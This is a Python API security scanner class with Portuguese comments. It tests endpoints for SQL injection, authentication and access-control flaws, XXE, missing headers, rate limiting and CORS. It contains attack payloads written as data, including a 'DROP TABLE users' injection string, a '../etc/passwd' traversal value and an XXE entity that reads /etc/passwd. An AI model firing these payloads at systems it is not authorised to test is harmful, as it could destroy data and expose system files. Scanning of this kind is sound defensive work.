import requests
import json
from typing import Dict, List
from urllib.parse import urljoin
import time

class APISecurityScanner:
    """Scanner completo para testes de segurança em APIs"""
    
    def __init__(self, base_url: str, headers: dict = None):
        self.base_url = base_url
        self.headers = headers or {}
        self.results = []
    
    def test_sql_injection(self, endpoint: str, params: dict) -> List[Dict]:
        """Testa injeção SQL em endpoints"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
        ]
        
        vulnerabilities = []
        url = urljoin(self.base_url, endpoint)
        
        for payload in sql_payloads:
            for param_name in params.keys():
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = requests.get(url, params=test_params, timeout=5)
                    
                    # Detecta possíveis vulnerabilidades
                    if any(error in response.text.lower() for error in 
                           ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'syntax error']):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'CRITICAL',
                            'endpoint': endpoint,
                            'parameter': param_name,
                            'payload': payload,
                            'response_code': response.status_code,
                            'description': 'Possível SQL Injection detectada através de mensagem de erro'
                        })
                except Exception as e:
                    pass
        
        return vulnerabilities
    
    def test_authentication(self, endpoint: str) -> List[Dict]:
        """Testa falhas de autenticação"""
        vulnerabilities = []
        url = urljoin(self.base_url, endpoint)
        
        # Teste sem autenticação
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'Broken Authentication',
                    'severity': 'HIGH',
                    'endpoint': endpoint,
                    'description': 'Endpoint acessível sem autenticação',
                    'response_code': response.status_code
                })
        except Exception as e:
            pass
        
        # Teste com token inválido
        try:
            invalid_headers = {'Authorization': 'Bearer invalid_token_12345'}
            response = requests.get(url, headers=invalid_headers, timeout=5)
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'Broken Authentication',
                    'severity': 'CRITICAL',
                    'endpoint': endpoint,
                    'description': 'Endpoint aceita tokens inválidos',
                    'response_code': response.status_code
                })
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def test_authorization(self, endpoint: str) -> List[Dict]:
        """Testa falhas de autorização e IDOR"""
        vulnerabilities = []
        url = urljoin(self.base_url, endpoint)
        
        # Testa IDOR (Insecure Direct Object Reference)
        test_ids = [1, 2, 999, 'admin', '../etc/passwd']
        
        for test_id in test_ids:
            try:
                test_url = url.replace('{id}', str(test_id))
                response = requests.get(test_url, headers=self.headers, timeout=5)
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Broken Access Control (IDOR)',
                        'severity': 'HIGH',
                        'endpoint': endpoint,
                        'test_id': test_id,
                        'description': 'Possível IDOR - acesso a recursos sem validação adequada',
                        'response_code': response.status_code
                    })
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def test_sensitive_data_exposure(self, endpoint: str) -> List[Dict]:
        """Testa exposição de dados sensíveis"""
        vulnerabilities = []
        url = urljoin(self.base_url, endpoint)
        
        try:
            response = requests.get(url, headers=self.headers, timeout=5)
            
            sensitive_keywords = [
                'password', 'secret', 'token', 'api_key', 
                'private_key', 'credit_card', 'ssn'
            ]
            
            response_text = response.text.lower()
            for keyword in sensitive_keywords:
                if keyword in response_text:
                    vulnerabilities.append({
                        'type': 'Sensitive Data Exposure',
                        'severity': 'HIGH',
                        'endpoint': endpoint,
                        'keyword': keyword,
                        'description': f'Possível exposição de dados sensíveis: {keyword}',
                        'response_code': response.status_code
                    })
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def test_xxe(self, endpoint: str) -> List[Dict]:
        """Testa XML External Entity (XXE)"""
        vulnerabilities = []
        url = urljoin(self.base_url, endpoint)
        
        xxe_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>'''
        
        try:
            headers = self.headers.copy()
            headers['Content-Type'] = 'application/xml'
            response = requests.post(url, data=xxe_payload, headers=headers, timeout=5)
            
            if 'root:' in response.text or '/bin/bash' in response.text:
                vulnerabilities.append({
                    'type': 'XML External Entity (XXE)',
                    'severity': 'CRITICAL',
                    'endpoint': endpoint,
                    'description': 'Vulnerabilidade XXE confirmada',
                    'response_code': response.status_code
                })
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def test_security_headers(self, endpoint: str) -> List[Dict]:
        """Testa headers de segurança"""
        vulnerabilities = []
        url = urljoin(self.base_url, endpoint)
        
        required_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'Strict-Transport-Security': 'max-age',
            'Content-Security-Policy': 'default-src',
            'X-XSS-Protection': '1'
        }
        
        try:
            response = requests.get(url, headers=self.headers, timeout=5)
            
            for header, expected in required_headers.items():
                if header not in response.headers:
                    vulnerabilities.append({
                        'type': 'Security Misconfiguration',
                        'severity': 'MEDIUM',
                        'endpoint': endpoint,
                        'missing_header': header,
                        'description': f'Header de segurança ausente: {header}',
                        'recommendation': f'Adicione o header {header}'
                    })
        except Exception as e:
            pass
        
        return vulnerabilities
    
    def test_rate_limiting(self, endpoint: str) -> List[Dict]:
        """Testa limitação de taxa (rate limiting)"""
        vulnerabilities = []
        url = urljoin(self.base_url, endpoint)
        
        # Faz múltiplas requisições rápidas
        responses = []
        for _ in range(50):
            try:
                response = requests.get(url, headers=self.headers, timeout=5)
                responses.append(response.status_code)
                time.sleep(0.01)
            except Exception as e:
                break
        
        # Se todas as requisições forem bem-sucedidas, pode não haver rate limiting
        if all(status == 200 for status in responses):
            vulnerabilities.append({
                'type': 'Missing Rate Limiting',
                'severity': 'MEDIUM',
                'endpoint': endpoint,
                'description': 'Endpoint não possui limitação de taxa adequada',
                'recommendation': 'Implemente rate limiting para prevenir abuso'
            })
        
        return vulnerabilities
    
    def test_cors(self, endpoint: str) -> List[Dict]:
        """Testa configuração CORS"""
        vulnerabilities = []
        url = urljoin(self.base_url, endpoint)
        
        malicious_origins = [
            'http://evil.com',
            'null',
            'http://localhost'
        ]
        
        for origin in malicious_origins:
            try:
                headers = self.headers.copy()
                headers['Origin'] = origin
                response = requests.get(url, headers=headers, timeout=5)
                
                if 'Access-Control-Allow-Origin' in response.headers:
                    allowed_origin = response.headers['Access-Control-Allow-Origin']
                    if allowed_origin == '*' or allowed_origin == origin:
                        vulnerabilities.append({
                            'type': 'CORS Misconfiguration',
                            'severity': 'MEDIUM',
                            'endpoint': endpoint,
                            'origin': origin,
                            'description': 'CORS configurado de forma insegura',
                            'recommendation': 'Restrinja origens permitidas'
                        })
            except Exception as e:
                pass
        
        return vulnerabilities
    
    def scan_endpoint(self, endpoint: str, params: dict = None) -> Dict:
        """Executa todos os testes em um endpoint"""
        params = params or {}
        all_vulnerabilities = []
        
        print(f"Scanning endpoint: {endpoint}")
        
        # Executa todos os testes
        all_vulnerabilities.extend(self.test_sql_injection(endpoint, params))
        all_vulnerabilities.extend(self.test_authentication(endpoint))
        all_vulnerabilities.extend(self.test_authorization(endpoint))
        all_vulnerabilities.extend(self.test_sensitive_data_exposure(endpoint))
        all_vulnerabilities.extend(self.test_xxe(endpoint))
        all_vulnerabilities.extend(self.test_security_headers(endpoint))
        all_vulnerabilities.extend(self.test_rate_limiting(endpoint))
        all_vulnerabilities.extend(self.test_cors(endpoint))
        
        # Estatísticas
        severity_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        for vuln in all_vulnerabilities:
            severity_count[vuln['severity']] += 1
        
        return {
            'endpoint': endpoint,
            'total_vulnerabilities': len(all_vulnerabilities),
            'vulnerabilities': all_vulnerabilities,
            'severity_count': severity_count
        }
    
    def full_scan(self, endpoints: List[str]) -> Dict:
        """Executa varredura completa em múltiplos endpoints"""
        all_results = []
        total_vulns = 0
        total_severity = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        
        for endpoint in endpoints:
            result = self.scan_endpoint(endpoint)
            all_results.append(result)
            total_vulns += result['total_vulnerabilities']
            
            for severity, count in result['severity_count'].items():
                total_severity[severity] += count
        
        return {
            'total_endpoints': len(endpoints),
            'total_vulnerabilities': total_vulns,
            'severity_count': total_severity,
            'endpoint_results': all_results,
            'scan_timestamp': time.time()
        }
